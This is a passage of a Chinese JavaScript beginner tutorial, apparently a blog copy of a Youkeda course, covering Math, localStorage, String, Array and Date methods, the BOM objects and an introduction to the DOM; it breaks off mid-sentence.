注意，以上方法除了Math.random()都需要传入合适的参数，即需要处理的数字。这里我们注意几个取整方法。使用的时候，给方法传入需要处理的数字即可:</code></pre><p>Math.ceil(4.6)//向上取整，取大于等于x，并且与它最接近的整数。<br>Math.floor(4.6)//向下取整，取小于等于x，并且与它最接近的整数。<br>Math.round(4.6) // 四舍五入取整，取与x最接近的整数。</p><pre><code>输出</code></pre><p>5<br>4<br>5</p><pre><code>除了Math之外，我们还要介绍一个常用的内置对象:Storage.#### Storage对象Storage接口用于脚本在浏览器保存数据。两个对象部署了这个接口: window.sessionStorage和window.localStorage.sessionStorage保存的数据用于浏览器的一次会话(session)，当会话结束(通常是窗口关闭)，数据被清空;localStorage 保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。我们主要看一下window.localStorage的用法。**数据的存入：setItem**写法：</code></pre><p>window.localStorage.setItem(‘myLocalStorage’, ‘storage Value’);</p><pre><code>window.localStorage.setltem('key', 'value'") 方法接受两个参数:1. key: 键名;2. value:键值两个参数都是字符串，不是字符串的参数会被转成字符串后再存入浏览器。&gt; 打开网页的开发者工具(右键=&gt;检查=&gt;application =&gt; Local Storage)， 查看存储情况:&gt; ![image](https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-4-HTML-CSS/7/4.jpg)注意，如果要存入的数据不是字符串类型的数据，最好先转换成字符串类型，比如要存入一个对象，可以这么写:</code></pre><p>const obj = {<br>  name: ‘henry’,<br>  age: 18<br>}<br>const value = JSON.stringify(obj);<br>window.localStorage.setItem(‘myLocalStorage’, value);</p><pre><code>&gt; JSON.stringify()方法可以将一个JavaScript值(对象&gt; 或者数组)转换为一个JSON字符串。**读取数据：getItem**写法：</code></pre><p>window.localStorage.getItem(‘myLocalStorage’);</p><pre><code>window.localStorage.getltem(key')接受一个参数，即键名。**清除缓存：clear**写法：</code></pre><p>window.localStorage.clear();</p><pre><code>该方法可清除所有保存的数据。案例：要求使用Storage对象的setltem方法，在本地浏览器中存入名为"myStorage"，值为任意字符串的数据，不可为空字符串。</code></pre><p>// 在本地浏览器中进行缓存<br>window.localStorage.setItem(‘myStorage’, ‘storage Value’);<br>// 打印缓存<br>const myStorage = window.localStorage.getItem(‘myStorage’)<br>console.log(myStorage)</p><pre><code>### 7.6内置对象————StringJavaScript原生提供的三个包装对象之一就是`String` (另外两个是Number、Boolean)。它给字符串提供了很多好用的方法，但是我们只要掌握很少的几个就已经足够了，我们一起来看一下。&gt; 包装对象:原生对象可以把原始类型的值变成(包装成)对象。&gt; ```let v2 = new String('abc');```&gt; 包装对象的最大目的:1.使得JavaScript的对象涵盖所有的值; 2.使得原始类型的值可以方便地调用某些方法(比如下面的这些方法)#### 字符串长度：length</code></pre><p>let len = ‘here is an apple’.length;</p><pre><code>大家猜猜这个长度是多少呢?答案是16，从上面的输出结果中可以看到，字符串中的空格也是计算在内的。#### 查找字符：indexOf()从字符串中查找某个子字符串是否存在：</code></pre><p>let str = ‘here is an apple’;<br>const index = str.indexOf(‘an’);<br>console.log(index);</p><pre><code>当str中存在子字符串an时，返回的值为an中的a所在的下标(下标从0开始计)，即8。当str中不存在子字符串an时,返回的值为-1。#### 去掉两端空格：trim()我们在输入内容的时候常常会遇到多输入空格的时候，这时候就可以用trim()把字符串开头和结束位置的空格去掉了:</code></pre><p>// ‘here’ 之前有一个空格，’apple’ 之后有三个空格<br>let str = ‘ here is an apple   ‘;<br>const trimedStr = str.trim();<br>console.log(str.length);<br>console.log(trimedStr.length);</p><pre><code>&gt; 注意，`trim()`是去掉字符串前后的空格，不论前后有多少空格,都会去掉，但不会去掉中间的空格。另外，trim() 不会改变原字符串str，而是复制一份原字符串，修改后返回给trimedStr#### 截取字符串：substring/substr如果要截取一个字符串中的一部分，可以用`substring` 或`substr`比如我们现在有一个[URL]("https://www.youkeda.com/userhome#collect") 要求截取其中#之后的内容，可以这样做:</code></pre><p>let url = ‘<a href="https://www.youkeda.com/userhome#collect'" target="_blank" rel="noopener">https://www.youkeda.com/userhome#collect'</a>;</p><p>// 首先找到 # 后第一个字母的下标<br>const index = url.indexOf(‘#’) + 1;</p><p>// 有 hash 才能进行截取，没有就直接提示不存在<br>if (index) {<br>  // 用 substring 截取字符串<br>  const hash1 = url.substring(index + 1, url.length);</p><p>  // 计算 hash 的长度<br>  const lenHash = url.length - index - 1;<br>  // 用 substr 截取字符串<br>  const hash2 = url.substr(index + 1, lenHash);</p><p>  console.log(hash1);<br>  console.log(hash2);<br>} else {<br>  console.log(‘不存在 hash’);<br>}</p><pre><code>- substring(start,end):start————要截取的字符串的开始下标end————要截取的字符串的结束下标。- substr(start,len):start————要截取的字符串的开始下标len一要截取的字符串的长度。&gt; 注意，substring和substr的第二个参数不写的时候，会一直截取到字符串结束为止。#### 分割字符串split方法按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组:</code></pre><p>const splitedStr = ‘a|b|c’.split(‘|’);<br>console.log(splitedStr);</p><pre><code>`split`也不会改变原字符串，而是返回一个由分割出来的子字符审组成#### 小结关于字符串我们需要掌握的几个基础用法:| 属性/用法          | 作用                                                         || ------------------ | ------------------------------------------------------------ || str.length         | 返回字符串长度                                               || str.indexOf(sub)   | 返回子字符串sub的开始下标，不存在则返回-1.注意:这里的参数sub是个字符串变量 || str.trim()         | 字符串前后去空格                                             || str.substring(s,e) | 截取下标从s到e的子字符串.注意:这里的参数s和e是个数字变量     || str.substr(s,len)  | 截取下标从s开始，长度为len的子字符串.注意:这里的参数s和len是个数字变量 || str.split(pattern) | 按规格pattern分割字符串.注意:这里的参数pattern是个字符串变量 |案例：写一个方法，这个方法能够返回一段文字去前后空格后的总字数方法名叫strLen.</code></pre><p>let str = ‘ 测试字符串 test’;<br>const len = strLen(str);</p><p>console.log(len);</p><pre><code>输出为10代码：</code></pre><p>let str = ‘ 测试字符串 test’;<br>const len = strLen(str);</p><p>console.log(len);</p><p>function strLen(Str) {<br>  const strtimed = Str.trim();<br>  return strtimed.length;<br>}</p><pre><code>#### 7.7内置对象————ArrayArray是JavaScript的原生对象之一，它为数组提供了很多实用的方法,这里我们学习其中的几个。##### 连接数组：join()join()方法以指定参数作为分隔符，将所有数组成员连接为一个字符串返回。如果不提供参数，默认用逗号分隔:</code></pre><p>let arr = [1, 2, 3, 4];</p><p>arr.join(‘ ‘) // ‘1 2 3 4’<br>arr.join(‘ | ‘) // “1 | 2 | 3 | 4”<br>arr.join() // “1,2,3,4”</p><pre><code>这个方法和字符串里的`split`方法正好是一对作用相反的方法:</code></pre><p>let str = ‘a|b|c’;</p><p>const splited = str.split(‘|’);<br>console.log(splited);</p><p>const joined = splited.join(‘|’);<br>console.log(joined);</p><pre><code>join()方法不会改变原数组。#### 倒序排列：reverse()rverse方法用于颠倒排列数组元素,返回改变后的数组。</code></pre><p>let arr = [‘a’, ‘b’, ‘c’];</p><p>arr.reverse() // [“c”, “b”, “a”]<br>arr // [“c”, “b”, “a”]</p><pre><code>这个方法对原本有序的数组用起来很方便，比如原来是按时间顺序排列,现在要倒序，直接使用`reverse()` 即可。那如果数组原本就是无序的，该怎么排序呢?这里我们会用到sort()方法。#### 排序：sort()sort方法对数组成员进行排序，默认是按照**字典顺序**排序。如果想让sort方法按照自定义方式排序，可以传入一个函数作为参数。现在我们将下面的数组按照人物年龄从小到大排列:</code></pre><p>let arr = [<br>  { name: ‘jenny’, age: 18 },<br>  { name: ‘tom’, age: 10 },<br>  { name: ‘mary’, age: 40 }<br>];</p><p>arr.sort(function(a, b) {<br>  return a.age - b.age;<br>});</p><p>console.log(arr);</p><pre><code>这里我们传入了一个函数，这个函数有两个参数，即进行比较的两个数组成员，愿数组中a排在b之前。这个函数有个返回值，当返回值大于0时，表示第一个成员应该排在第二个成员之后，否则排在第二个成员之前。#### 遍历：map/forEach遍历数组我们之前用的是`for`循环，但其实JavaScript为我们提供了两个很方便的遍历方法: map和forEach。##### 有返回的遍历：map先看map方法的使用，它接受-个函数,然后将数组的所有成员依次传入这个参数函数，最后把每一次的执行结果组成一个新数组返回:</code></pre><p>let arr = [<br>  { name: ‘jenny’, age: 18 },<br>  { name: ‘tom’, age: 10 },<br>  { name: ‘mary’, age: 40 }<br>];</p><p>// elem: 数组成员<br>// index: 成员下标<br>// a: 整个数组<br>const handledArr = arr.map(function(elem, index, a) {<br>  elem.age += 1;<br>  console.log(elem, index, a);<br>  return elem.name<br>});</p><p>console.log(arr);<br>console.log(handledArr);</p><pre><code>map方法的参数函数可以有三个参数: elem, index, a。- elem: 表示依次传入的数组成员- index: 表示依次传入的数组成员所对应的下标- a:表示整个数组在上面的代码中，map方法的返回值是一个由`return`后的内容`elem. name`组成的数组。##### 无返回值的遍历：forEachforEach的用法和map基本一致，不过forEach没有返回值:</code></pre><p>const handledArr = arr.forEach(function(elem, index, a) {<br>  elem.age += 1;<br>  console.log(elem, index, a);<br>  return elem.name<br>});</p><p>console.log(handledArr);</p><pre><code>输出：undefined&gt; 注意，当你在map和forEach之间难以选择时，可以想一下你是否需要返回值，map会返回操作后的数组，forEach则没有返回值。小结：关于数组我们需要掌握的几个基础用法:| 属性/方法         | 作用                                                         || ----------------- | ------------------------------------------------------------ || arr.join(pattren) | 按规则pattern连接数组,返回字符串                             || arr.reverse()     | 将原数组倒序排列                                             || arr.sort(func)    | 自定义排序，根据传入的参数函数func将数组成员排序             || arr.map(func)     | 根据传入的参数函数func对数组进行遍历操作，返回操作后的数组.函数有三个参数，依次为:数组成员、对应下标、整个数组 || arr.forEach(func) | 根据传入的参数函数func对数组进行遍历操作，无返回值函数有三个参数，依次为:数组成员、对应下标、整个数组 |案例：已知数组如下：</code></pre><p>let arr = [<br>  { name: ‘jenny’, age: 18 },<br>  { name: ‘tom’, age: 10 },<br>  { name: ‘mary’, age: 40 }<br>];</p><pre><code>要求不用for循环在控制台打印出每一项的name属性，每个name之间用`,`连接,预期输出结果如下:</code></pre><p>jenny,tom,mary</p><pre><code>代码：</code></pre><p>let arr = [<br>  { name: ‘jenny’, age: 18 },<br>  { name: ‘tom’, age: 10 },<br>  { name: ‘mary’, age: 40 }<br>];</p><p>const nameList = []<br>arr.forEach(item =&gt; {<br>  nameList.push(item.name);<br>})<br>console.log(nameList.join(‘,’))</p><pre><code>### 7.8内置对象————Date工作中常常遇到要处理时间的情况：![image](https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-4-HTML-CSS/7/2.jpg)因此很有必要学习一下JavaScript提供的时间库的一些功能。JavaScript提供一个原生的时间库:`Date`对象。它以国际标准时间(UTC)1970年1月1日00:00:00作为时间的零点，可以表示的时间范围是前后各1亿天(单位为毫秒)。在这里我们只学习其中一些必须的基础内容。#### 获取当前时间：new Date()我们可以把Date作为一个构造函数，用new命令生成一一个时间对象的实例，在不加参数的情况下，返回的是当前时间:</code></pre><p>let now = new Date();<br>console.log(now);</p><pre><code>那如果给构造函数传入一些参数的话，就能够**生成特定的时间对象**了，这里可以传入数字、字符串、毫秒数:</code></pre><p>// 传入表示“年月日时分秒”的数字<br>let dt1 = new Date(2020, 0, 6, 0, 0, 0);<br>console.log(dt1);</p><p>// 传入日期字符串<br>let dt2 = new Date(‘2020-1-6’);<br>console.log(dt2);</p><p>// 传入距离国际标准时间的毫秒数<br>let dt3 = new Date(1578240000000);<br>console.log(dt3);</p><pre><code>&gt; 注意，传入表示"年月日时分秒”的数字时，1.如果只传入一个数字，会被认为传入的是毫秒数;2.月份的范围是0-11,而不是1-12。#### 日期运算##### 时间差：毫秒数两个时间对象是可以直接相减的，返回值为两者的毫秒数差:</code></pre><p>let dt1 = new Date(2020, 2, 1);<br>let dt2 = new Date(2020, 3, 1);</p><p>// 求差值<br>let diff = dt2 - dt1;</p><p>// 一天的毫秒数<br>let ms = 24 * 60 * 60 * 1000;</p><p>console.log(diff / ms); // 31</p><pre><code>可以看到，2020年2月1日和2020年3月1日之间相差的时间正好为31天。##### 早晚比较：大小于符号如果要比较两个时间的早晚，可以直接使用`&gt;`或者`&lt;`</code></pre><p>let dt1 = new Date(2020, 2, 1);<br>let dt2 = new Date(2020, 3, 1);</p><p>console.log(dt1 &gt; dt2); // false<br>console.log(dt1 &lt; dt2); // true</p><pre><code>#### 解析日期字符串：Date.parse()Date.parse方法用来解析日期字符串，返回该时间距离时间零点(1970年1月1日00:00:00)的毫秒数:</code></pre><p>let dt = Date.parse(‘2020-1-6’);<br>console.log(dt); // 1578240000000</p><pre><code>`Date. parse()`方法可以把日期字符串转成距离时间零点的毫秒数。时间对象中有三大类方法to方法、get方法和set方法，这里我们会学习这两大类中的一部分方法。#### 时间对象转时间字符串：to方法to方法有很多，我们来看其中的`toJSON()`方法:</code></pre><p>let dt = new Date();<br>let dtStr = dt.toJSON();</p><p>console.log(dtStr); // 2020-01-03T09:44:18.220Z</p><pre><code>仔细观察控制台中打印出的内容，你可能会感到疑惑，为什么打印的时间和当前的时间差8个小时，这是因为打印的时间是现在UTC时区的时间,而我们的时间是东八区时间，比国际标准时间快8个小时。#### 获取时间对象的年/月/日：get方法Date对象提供了一系列get方法,用来获取实例对象某个方面的值:</code></pre><p>let dt = new Date();<br>dt.getTime(); // 返回实例距离1970年1月1日00:00:00的毫秒数。<br>dt.getDate(); // 返回实例对象对应每个月的几号（从1开始）。<br>dt.getDay(); // 返回星期几，星期日为0，星期一为1，以此类推。<br>dt.getFullYear(); // 返回四位的年份。<br>dt.getMonth(); // 返回月份（0表示1月，11表示12月）。<br>dt.getHours(); // 返回小时（0-23）。<br>dt.getMilliseconds(); // 返回毫秒（0-999）。<br>dt.getMinutes(); // 返回分钟（0-59）。<br>dt.getSeconds(); // 返回秒（0-59）。</p><pre><code>&gt; 注意，所有这些get*方法返回的都是整数，不同方法返回值的范围不一样:&gt; 分钟和秒: 0到59&gt; 小时:0到23&gt; 星期: 0 (星期天)到6 (星期六)&gt; 日期:1到31&gt; 月份: 0 (一月)到11 (十二月)- 除了”日期”外，其他的时间范围都是从0开始的。以方法了解即可，需要用到的时候在MDN上进行查询即可。现在我们来尝试用dt.getFullYear()来获取当前的完整年份:</code></pre><p>let dt = new Date();<br>let year = dt.getFullYear();</p><p>console.log(year);</p><pre><code>#### 设置时间对象的年/月/日：set方法set方法和get方法正好相反，它能够设置时间对象的某个方面的值。</code></pre><p>let dt = new Date();<br>dt.setTime(ms); // 设置实例距离1970年1月1日00:00:00的毫秒数。<br>dt.setDate(date); // 设置实例对象对应每个月的几号（从1开始）。<br>dt.setFullYear(year); // 设置四位的年份。<br>dt.setMonth(month); // 设置月份（0表示1月，11表示12月）。<br>dt.setHours(hour); // 设置小时（0-23）。<br>dt.setMilliseconds(ms); // 设置毫秒（0-999）。<br>dt.setMinutes(min); // 设置分钟（0-59）。<br>dt.setSeconds(sec); // 设置秒（0-59）。</p><pre><code>&gt; set方法没有setDay方法,因为星期几是计算得到的。同样的，以上方法了解即可，需要用到的时候在MDN.上进行查询即可。现在我们来尝试用dt.getFullYear()来获取当前的完整年份:</code></pre><p>let dt = new Date();<br>dt.setFullYear(2030);</p><p>console.log(dt);</p><pre><code>#### 小结时间对象、日期字符串和毫秒数之间是可以相互转换的，一图胜干言，我们把转换的规则总结成了一张图:![image](https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-4-HTML-CSS/7/3.jpg)案例：如右边代码所示，已知一组活动信息，请按照活动的开始时间从早到晚将信息排序，并将开始时间格式化，例如:'2020-01-0113:00:00'格式化后为:'2020年1月1日13点0分'。格式化后的时间要求保存在对应的活动信息中，属性名为formattedDate,如:</code></pre><p>let infoList = [<br>  {<br>    id: ‘20020101’,<br>    startTime: ‘2020-01-01 13:00:00’,<br>    description: ‘现在加入，即刻领取属于自己的英雄’<br>  }<br>];</p><p>// 格式化时间后<br>let infoList = [<br>  {<br>    id: ‘20020101’,<br>    startTime: ‘2020-01-01 13:00:00’,<br>    description: ‘现在加入，即刻领取属于自己的英雄’,<br>    formattedDate: ‘2020年1月1日 13点0分’<br>  }<br>];</p><pre><code>代码：</code></pre><p>let infoList = [<br>  {<br>    id: ‘20020101’,<br>    startTime: ‘2020-01-01 13:00:00’,<br>    description: ‘现在加入，即刻领取属于自己的英雄’<br>  },<br>  {<br>    id: ‘20032101’,<br>    startTime: ‘2020-03-21 14:00:00’,<br>    description: ‘寓教于乐一家亲，深入浅出一片心’<br>  },<br>  {<br>    id: ‘20011001’,<br>    startTime: ‘2020-01-10 08:00:00’,<br>    description: ‘让孩子在游戏中爱上学习’<br>  },<br>  {<br>    id: ‘19111101’,<br>    startTime: ‘2019-11-11 09:30:00’,<br>    description: ‘发行的不是游戏，是快乐’<br>  }<br>];</p><p>// 排序<br>infoList.sort((a, b) =&gt; {<br>  //return a.startTime - b.startTime;<br>  const aStartDate = new Date(a.startTime);<br>  const bStartDate = new Date(b.startTime);<br>  return aStartDate &gt; bStartDate ? 1 : -1;<br>});</p><p>// 格式化时间<br>infoList.forEach(info =&gt; {<br>  info.formattedDate = formatDate(info.startTime);<br>});</p><p>// 打印结果<br>console.log(infoList);</p><p>// 格式化时间的函数<br>function formatDate(dtStr) {<br>  // 把时间字符串转为 Date 实例<br>  let date = new Date(dtStr);<br>  //let d = new Date(Date.parse(dtStr.replace(/-/g, “/“)));</p><p>  // 获取：年、月、日、时、分<br>  const year = date.getFullYear();<br>  const month = date.getMonth()+1;<br>  const day = date.getDate();<br>  const hour = date.getHours();<br>  const min = date.getMinutes();</p><p>  return year + ‘年’ + month + ‘月’ + day + ‘日 ‘ + hour + ‘点’ + min + ‘分’;<br>}</p><pre><code>## 第八章 BOM### 8.1BOM在之前的7章课程中，我们已经学会了`Javascript`的基本语法。大家肯定有疑惑，我知道这些语法,怎么和我们的HTML,I CSsS 一起联合起来使用呢?本节课开始我们将开始学习这一部分， 重点教会大家完成**页面交互过程**。#### BOM我们知道为了让网页能显示出来,首先我们得在浏览器中输入网址，敲击回车，浏览器能自动帮我们渲染网页内容和浏览器渲染有关的对象，我们叫做**浏览器对象模型(Browser Object Model) --- BOM**。**BOM**是由一系列相关对象构成，每个对象都提供了很多方法和属性。但BOM缺乏标准，BOM属于约定俗成,比如Chrome怎么实现，FireFox, IE 等等就照抄一下。所以不同浏览器并不完全相同，在前端有一门高级技术叫做**浏览器兼容处理**，也就是处理这类问题，我们在之后会涉及到。现在业界主要以**Chrome**为准(这也是我们希望大家用Chrome进行学习的原因)。在这里我们主要学习**BOM**一些共同的对象和API。#### BOM对象在BOM里最重要的对象有4个，分别如下: - **window (窗口)** : window是整个网页的框架，每个网页的内容都是装载在window里面- **navigator (浏览器)** : navigator里面存储浏览器相关信息- **history (历史)**:我们知道每个网页可以前进后端，history 便拿来存储整个网页栈的- **screen (显示屏幕)**:screen包含我们显示屏幕的信息，这个是硬件信息- **Location (地址)**:location包含当前访问的地址(网址)信息下面我以我的电脑为例，让大家更形象看看BOM对象在电脑上位置:![image](https://style.youkeda.com/img/course/f4/8/1.jpeg)**特别强调几点。**1. screen是整个电脑唯一的2. navigator是整个浏览器唯一的， 如果有多个浏览器就会有多个navigator3. window是每个网页唯一的， 每个网页都有一个独立的window4. history, location 是每个网页的信息，当然也是网页唯一的### 8.2windows#### HTML中嵌入JavaScript在所有的BOM中最重要的是**window对象**，我们这节课来详细学习下。在之前的学习中我们只是单纯写`javascript`，我们这次把javascript写入到HTML代码中，方便执行。我们在页面中打印优课达-学的比别人好一点，代码如下:</code></pre>      <meta charset="UTF-8">    <title>优课达</title>  <meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><link rel="alternate" href="/atom.xml" title="我的个人blog" type="application/atom+xml">      <h1>优课达-学的比别人好一点</h1>    <script src="./index.js"></script>  ```我们在`body`底部加入`<script src="./index.js"></script>`，嵌入执行脚本。<p>然后在<code>index.js</code>脚本中加入<code>javascript</code>代码。执行一下:</p><p>最终在控制台打印出：</p><pre><code>"优课达-学的比别人好一点"</code></pre><h4 id="window"><a href="#window" class="headerlink" title="window"></a>window</h4><p>在Javascript学习中，最好用的学习和排查问题方法就是- –<br><strong>console.log</strong>,在这里我们打印一下window,看看window到底是什么</p><p>右下角<strong>JSConsole</strong>的内容如下图所示：<br><img src="https://style.youkeda.com/img/course/f4/8/2.png" alt="image"></p><p>我们看到<code>window</code>对象中，有很多<strong>方法</strong>，比如<code>alert</code>，<code>confirm</code>还有一些属性对象比如: <code>console</code> ，<code>screen</code> ，<code>navigator</code> ，<code>location</code>如果看不清楚，我们还可以打开MDN文档<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window" target="_blank" rel="noopener">MDN</a><br>官方解释为:</p><ol><li>window对象表示一个浏览器窗口或一个frame框架，它处于对象层次的<strong>最顶端</strong>，它提供了处理浏览器窗口的方法和属性。</li><li>window对象是浏览器对象中的<strong>默认对象</strong>，所以可以隐式地引用window对象的属性和方法。在浏览器环境中，添加到window对象中的方法、属性等，其作用域都是全局的。</li></ol><p>第一点不难理解，我们主要解释第二点，什么叫做默认对象?什么叫做隐式引用?</p><p>举个例子：</p><pre><code>console.log('优课达');window.console.log('优课达');console.log(navigator);console.log(window.navigator);function hello() {}console.log(hello);console.log(window.hello);</code></pre><p>我们看出<code>console.1og</code>等于<code>window.console.1og</code>，<code>navigator</code>等于<code>window.navigator</code>,甚至自定义的顶层函数，也是挂载在<code>window</code>下面的。</p><p>除此之外，之前讲的<code>Math</code>对象，<code>setTimeout</code>函数，<code>setInterva1</code>函数都是挂载在window下面,这里课程就不演示了，大家有兴趣自己去尝试一下。</p><p>总结一下:</p><blockquote><p>window是默认对象，如果是调用window.上面的方法,可以省略，也可以称为隐式调用window上面的属性和方法。</p></blockquote><p>案例</p><p>请大家阅读MDN中window对象，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window" target="_blank" rel="noopener">window</a></p><p>找到获取浏览器窗口的内容区域的宽度和高度的属性，并将其打印</p><p>代码：</p><pre><code>//下面打印浏览器窗口内容区域的宽度console.log(window.innerWidth)//下面打印浏览器窗口内容区域的高度console.log(window.innerHeight)</code></pre><p>案例2：</p><p>请大家阅读MDN中window对象，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window" target="_blank" rel="noopener">window</a></p><p>找到打开新窗口的方法，并打开网址<code>https://www.youkeda.com</code></p><p>提示:<br>本次调用的是方法，而不是属性喔。</p><p>代码：</p><pre><code>//下面调用打开新窗口的方法window.open(https://www.youkeda.com);</code></pre><h3 id="8-3Location-History"><a href="#8-3Location-History" class="headerlink" title="8.3Location/History"></a>8.3Location/History</h3><h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><p>我们继续学习Location对象，其用来保存当前网页位置的信息。<br>和之前一样，我们直接使用console.log 打印出来看看。</p><p><strong>Location属性</strong></p><p>用图表示如下(pathname 太长，部分省略代替) :<br><img src="https://style.youkeda.com/img/course/f4/8/3.jpeg" alt="image"><br>上面的不同属性都表示URL的不同部分，大家可以尝试利用这个规则去分析其他网页信息。</p><p><strong>Location方法</strong></p><p>在Location方法中，我们重点只需要掌握一个方法 — <strong>reload()</strong>。</p><p>为了防止无限快速循环，我们设置一个定时器延迟调用reload。</p><pre><code>setTimeout(function () {  window.location.reload();}, 3000);</code></pre><p>其他方法，大家了解一下即可，几乎不会用到，</p><p><strong>跳转到新的地址</strong></p><p>我们同样可以修改Location,直接将网页地址赋值给Location即可,<br>代码如下:</p><pre><code>window.location = 'https://www.youkeda.com';</code></pre><h4 id="History"><a href="#History" class="headerlink" title="History"></a>History</h4><p><strong>History</strong>允许操作浏览器的曾经在标签页或者框架里访问的会话历史记录，由这个名称我们得知，History会存储该窗口的历史记录。</p><p>mdn地址为：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/History" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/History</a></p><p>我们以上面跳转到新地址举例，如果原始网页为<br><code>https://www.youkeda.com</code>那history中存储为</p><pre><code>// 会话记录['https://www.youkeda.com'];</code></pre><p>如果我们在网页中点击某个链接，或者使用<code>window.location = xxx</code>跳转到<code>https://www.baidu.com</code>,那history中存储为</p><pre><code>// 会话记录['https://www.youkeda.com', 'https://www.baidu.com'];</code></pre><p>后续访问，以此类推。大家学过JS基础的话应该能看出来这是一个数组(或者说是列表)，在实际存储中用到的数据结构和数组特别类似，叫做<strong>栈</strong>。</p><p>在history中需要掌握两个方法，<strong>back()</strong>和<strong>forward()</strong>, 分别对应到浏览器左上角的返回和前进按钮。理解比较简单，在课程中就不演示了。</p><p>案例：</p><p>本节课我们利用上面学到的知识改变了网址。</p><p>题目要求:在本网页的地址的基础上修改search值为?spm=youkeda,并延迟3s跳转到新地址。</p><p>案例如下:</p><pre><code>// 原始地址https://resource.youkeda.com/wss/index.html?time=1580454161498// 目标地址https://resource.youkeda.com/wss/index.html?spm=youkeda</code></pre><p>注意最后问号区域</p><p><strong>提示：</strong></p><ol><li>利用Location先获取地址信息</li><li>利用JS字符串拼接修改地址信息</li><li>利用Location的方法跳转到新的地址。</li></ol><pre><code>setTimeout(function() {  window.location =    window.location.origin + window.location.pathname + '?spm=youkeda';}, 3000);</code></pre><h3 id="8-4Navigator-Screen"><a href="#8-4Navigator-Screen" class="headerlink" title="8.4Navigator/Screen"></a>8.4Navigator/Screen</h3><h4 id="Navigator"><a href="#Navigator" class="headerlink" title="Navigator"></a>Navigator</h4><p>Navigator表示用户代理的状态和标识，也就是浏览器基本信息，在这里面我们需要了解一个属性—userAgent,代表当前浏览器的用户代理。</p><p>演示一下:</p><pre><code>console.log(window.navigator.userAgent)</code></pre><p>结果：</p><pre><code>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/79.0.3945.130 Safari/537.36</code></pre><p>从这个信息中我们可以得知</p><blockquote><p>Mozilla是一个基金会，表示这是一个主流浏览器</p></blockquote><blockquote><p>Intel Mac OS X表示电脑信息为Mac</p></blockquote><blockquote><p>Chrome/79.0表示浏览器版本</p></blockquote><p>大家可以根据自己的输出信息分析下自己的数据。</p><p>案例：</p><p><strong>Screen</strong><br>Screen我们就不用介绍了，希望大家能养成查文档的好习惯。</p><p>以后到公司找文档和解决方案的能力是衡量一个程序员能力高低的最主要的手段之一。</p><p>本次把Screen当做作业来练习，请大家在MDN中查找window. screen 相关的文档，并根据文档指示，获取电脑屏幕的宽度和高度，并打印出来。</p><pre><code>// 打印电脑屏幕的宽度console.log(window.screen.width);// 打印电脑屏幕的高度console.log(window.screen.height);</code></pre><h2 id="第九章-DOM"><a href="#第九章-DOM" class="headerlink" title="第九章 DOM"></a>第九章 DOM</h2><h3 id="9-1初识DOM"><a href="#9-1初识DOM" class="headerlink" title="9.1初识DOM"></a>9.1初识DOM</h3><h4 id="初识DMO"><a href="#初识DMO" class="headerlink" title="初识DMO"></a>初识DMO</h4><p>先给大家打一个预防针，本节课是<strong>整个Javascript 甚至整个前端最最核心的内容</strong>，大家一定要认真仔细学习。</p><p>当然本节内容也非常多，我会化繁为简，抽取其中最实用的给大家介绍。</p><p>在之前课程中我们都学习过HTML、CSS,本课程也掌握了Javascript 的一些基本语法，大家是否有疑问:</p><p>都说前端三板斧，那Javascript和HTML、CSS有什么联系呢?怎么使用Javascript来操作HTML和CSS呢?</p><p>这就归功于本节课的重点—<strong>文档对象模型</strong>，Document Object Model 一般我们简称为DOM。</p><p>官方解释为:</p><blockquote><p>文档对象模型(DOM)可以将<strong>web页面</strong>与<strong>脚本或编程语言</strong>连接起来。</p></blockquote><p>我们来理解下这句话，有两个重点:</p><h5 id="1-web页面"><a href="#1-web页面" class="headerlink" title="1.web页面"></a>1.web页面</h5><blockquote><p>这里的web页面，也就是之前我们用HTML和CSS绘制的页面，也称作为<strong>文档</strong></p></blockquote><h5 id="2-脚本或编程语言"><a href="#2-脚本或编程语言" class="headerlink" title="2.脚本或编程语言"></a>2.脚本或编程语言</h5><p>为什么这里不直接说将Web页面和Javascript语言连接起来，而要绕一下说<strong>脚本或编程语言</strong>呢?</p><blockquote><p>因为DOM是一种规范，或者是一种约定，只要遵循这个规范,那么无论是Javascript,还是python，或者java都可以被连接起来。</p></blockquote><p>那紧接着，我们来看看DOM是如何将实现连接的? </p><h4 id="DOM映射"><a href="#DOM映射" class="headerlink" title="DOM映射"></a>DOM映射</h4><p>我们平时写HTML的时候，大多都认为HTML是平面的东西，一堆文字包裹在一堆标签中间。但实际上像HTML和XML这种形式的文档都是<strong>树状结构</strong>，也对应数据结构中的<strong>树</strong>。</p><p>我们写一个简单的Web页面(HTML代码编写)，并尝试将其转换成树。</p><pre><code>&lt;html&gt;  &lt;head&gt;    &lt;title&gt;youkeda&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div&gt;      &lt;h1&gt;优课达&lt;/h1&gt;      &lt;p&gt;学的比别人好一点&lt;/p&gt;    &lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>转换成的树图示如下：<br><img src="https://style.youkeda.com/img/course/f4/9/1.jpeg" alt="image"><br>图示就是一棵倒着的树，最顶部我们称为树根，这棵树就是DOM树。</p><p>我们总结下DOM树特性:</p><ol><li>树根是DOCUMENT,也可以称为整个页面文档</li><li>每个HTML标签我们称之为<strong>DOM节点</strong>，英文为<strong>Node或者ELement</strong></li><li>每个HTML标签包裹的子标签,在树上体现为分支,称为<strong>儿子节点</strong>。比如上图，<code>P</code>和<code>H1</code>都是<code>DIV</code>的儿子节点。<code>DIV</code> 同样也是<code>BODY</code>的儿子节<br>点。</li><li>儿子节点类推可以得知<code>P</code>,<code>H1</code>是<code>BODY</code>的孙子节点。</li><li>所有<code>P</code>，<code>H1</code>的长辈，我们称为<code>P</code>和<code>H1</code>的祖先节点。</li><li><code>P</code>, 